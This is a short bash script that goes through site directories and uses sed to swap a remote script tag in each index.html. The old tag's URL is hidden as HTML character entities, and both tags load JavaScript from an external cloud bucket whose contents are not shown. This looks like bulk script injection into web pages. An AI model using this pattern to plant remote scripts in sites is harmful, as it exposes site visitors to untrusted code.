#!/bin/bash

function seed(){

	sed -i 's/<script src=\"&#104&#116&#116&#112&#115&#58&#47&#47&#97&#104&#97&#105&#46&#111&#115&#115&#45&#99&#110&#45&#115&#104&#97&#110&#103&#104&#97&#105&#46&#97&#108&#105&#121&#117&#110&#99&#115&#46&#99&#111&#109&#47&#120&#105&#97&#111&#109&#101&#110&#103&#46&#106&#115\" rel=\"nofollow\"><\/script>/<script src=\"https:\/\/ahai.oss-cn-shanghai.aliyuncs.com\/wzah.js\"><\/script>/' ./$1/index.html

	echo "success $1 !"
}

echo "<=======start=======>"
for dir in $(ls ./)
do
	if [ "$dir" != "exchange.sh" ]; then
		 [ -d $dir ] && seed $dir
	fi
done

echo "<=======complete=======>"

sleep 30    